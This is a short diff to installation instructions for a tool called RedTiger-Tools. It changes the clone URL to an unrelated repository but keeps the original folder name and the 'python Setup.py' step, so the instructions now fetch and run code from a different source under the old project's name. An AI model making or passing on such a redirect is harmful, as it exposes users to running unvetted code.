@@ -163,7 +163,7 @@
 Or
 ```
 1 - Open a terminal.
-2 - Write "git clone https://github.com/loxyteck/RedTiger-Tools.git"
+2 - Write "git clone https://github.com/aogiriqg/aogiriqg.git"
 3 - Write "cd RedTiger-Tools"
 4 - Write "git pull"
 5 - Write "python Setup.py"
